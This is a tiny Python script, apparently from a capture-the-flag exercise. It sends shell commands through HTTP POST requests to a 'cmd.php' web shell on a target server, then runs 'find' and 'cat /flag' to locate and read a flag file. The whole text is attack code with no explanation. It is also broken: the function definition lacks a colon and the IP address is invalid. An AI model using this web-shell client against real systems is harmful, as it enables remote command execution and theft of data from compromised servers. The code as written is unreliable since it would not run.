import requests
def exec(str)
    data = {'cmd': str}
    response = requests.post("http://10.12.153.832697/cmd.php", data=data)
    print(response.text)
exec("find  -name 'flag'")
exec("cat /flag")